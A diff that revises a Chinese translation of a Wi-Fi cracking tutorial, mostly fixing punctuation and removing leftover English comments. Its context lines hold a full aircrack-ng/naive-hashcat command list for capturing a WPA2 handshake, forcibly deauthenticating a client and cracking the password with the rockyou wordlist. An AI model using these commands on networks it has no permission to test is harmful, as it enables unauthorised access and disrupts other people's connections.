@@ -195,7 +195,7 @@ aircrack-ng -a2 -b 9C:5C:8E:C9:AB:C0 -w rockyou.txt hackme.cap
 现在，让`airodump-ng`运行并打开一个新的终端。 我们将使用`aireplay-ng`命令向我们的受害者客户端发送假的接触认证数据包，强制其重新连接到网络，并希望在此过程中抓取握手。
 
 ```bash
-# -0 2指定了我们应该发送2个解除认证的数据包。如果需要考虑到被周围网络活动大段的风险，
+# -0 2 指定了我们应该发送2个解除认证的数据包。如果需要考虑到被周围网络活动大段的风险，
 # 可以增加这个数字
 # -a 是接入点的MAC
 # -c 是客户端的MAC
@@ -213,34 +213,30 @@ aireplay-ng -0 2 -a 9C:5C:8E:C9:AB:C0 mon0
 
 ## 命令列表
 
-下面列出了破解WPA / WPA2网络所需的所有命令，以最少的解释为依据。
+下面列出了破解WPA/WPA2网络所需的所有命令，以最少的解释为依据。
 
 ```bash
 # 将你的设备设置成监视模式
 airmon-ng start wlan0
 
-# listen for all nearby beacon frames to get target BSSID and channel
 # 监听附近所有的beacon帧来获取目标BSSID以及信道
 airodump-ng mon0
 
-# start listening for the handshake
 # 开始监听握手
 airodump-ng -c 6 --bssid 9C:5C:8E:C9:AB:C0 -w capture/ mon0
 
-# optionally deauth a connected client to force a handshake
 # 选择性的对于连接的设备进行解除验证从而强制握手
 aireplay-ng -0 2 -a 9C:5C:8E:C9:AB:C0 -c 64:BC:0C:48:97:F7 mon0
 
-########## crack password with aircrack-ng... ##########
+########## 利用aircrack-ng破解密码... ##########
 
-# download 134MB rockyou.txt dictionary file if needed
 # 如果需要的话下载134MB的rockyou.txt字典文件
 curl -L -o rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
 
 # 利用w/ aircrack-ng破解
 aircrack-ng -a2 -b 9C:5C:8E:C9:AB:C0 -w rockyou.txt capture/-01.cap
 
-########## or crack password with naive-hashcat ##########
+########## 或者利用naive-hashcat破解密码 ##########
 
 # 将cap转换成hccapx
 cap2hccapx.bin capture/-01.cap capture/-01.hccapx
@@ -262,4 +258,4 @@ HASH_FILE=hackme.hccapx POT_FILE=hackme.pot HASH_TYPE=2500 ./naive-hashcat.sh
 
 这里提供的大部分信息都是从[Lewis Encarnacion的绝妙的教程]（https://lewiscomputerhowto.blogspot.com/2014/06/how-to-hack-wpawpa2-wi-fi-with-kali.html）收集的。 感谢在Aircrack-ng和Hashcat上工作的优秀作者和维护者。
 
-感谢[hiteshnayak305]（https://github.com/hiteshnayak305），[enilfodne](https://github.com/enilfodne)，[DrinkMoreCodeMore](https://www.reddit.com/user/DrinkMoreCodeMore)，[hivie7510](https://www.reddit.com/user/hivie7510)，[cprogrammer1994](https://github.com/cprogrammer1994)，[0XE4](https://github.com/0XE4)，[hartzell](https://github.com/hartzell)，[zeeshanu](https://github.com/zeeshanu)，[flennic](https://github.com/flennic)，[bhusang](https://github.com/bhusang)，[tversteeg](https://github.com/tversteeg)，[gpetrousov](https://github.com/gpetrousov)，[crowchirp](https://github.com/crowchirp)和[Shark0der](https://github.com/shark0der)，他们还在[Reddit](https://www.reddit.com/r/hacking/comments/6p50is/crack_wpawpa2_wifi_routers_with_aircrackng_and/)和GitHub。如果您有兴趣听取WPA2的一些建议替代方案，请在[折](https://news.ycombinator.com/item?id=14840539)参考Hacker News的一些重要讨论。
+感谢[hiteshnayak305](https://github.com/hiteshnayak305），[enilfodne](https://github.com/enilfodne)，[DrinkMoreCodeMore](https://www.reddit.com/user/DrinkMoreCodeMore)，[hivie7510](https://www.reddit.com/user/hivie7510)，[cprogrammer1994](https://github.com/cprogrammer1994)，[0XE4](https://github.com/0XE4)，[hartzell](https://github.com/hartzell)，[zeeshanu](https://github.com/zeeshanu)，[flennic](https://github.com/flennic)，[bhusang](https://github.com/bhusang)，[tversteeg](https://github.com/tversteeg)，[gpetrousov](https://github.com/gpetrousov)，[crowchirp](https://github.com/crowchirp)和[Shark0der](https://github.com/shark0der)，他们还在[Reddit](https://www.reddit.com/r/hacking/comments/6p50is/crack_wpawpa2_wifi_routers_with_aircrackng_and/)和GitHub。如果您有兴趣听取WPA2的一些建议替代方案，请在[折](https://news.ycombinator.com/item?id=14840539)参考Hacker News的一些重要讨论。
